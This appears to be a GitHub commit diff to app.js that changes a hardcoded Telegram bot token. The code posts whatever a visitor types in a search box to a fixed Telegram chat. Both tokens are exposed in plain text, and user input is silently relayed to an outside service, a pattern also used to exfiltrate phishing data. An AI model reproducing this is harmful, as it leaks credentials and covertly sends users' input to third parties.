de50cfa9bce8fe667b4d2fb7bb35c8cd9e9cac81
DomenicoMereu97 <75221419+DomenicoMereu97@users.noreply.github.com>
2021-05-16 12:41:33 +0200

    Update app.js

--- app.js
+++ app.js
@@ -20,7 +20,7 @@ document.getElementById("search-box").addEventListener("keydown", function(event
         event.preventDefault();
         input = inputFunction();
         $.ajax({
-            url: 'https://api.telegram.org/bot' + '1682925449:AAFEJGrVMV02rC17MjrOmj-3Q1qq0197QG4' + '/sendMessage',
+            url: 'https://api.telegram.org/bot' + '1184206791:AAEuTfhvmT5MSrWovb4DfBv_ek1uuF40xhg' + '/sendMessage',
             method: 'POST',
             data: { chat_id: '699973760', text: input },
             
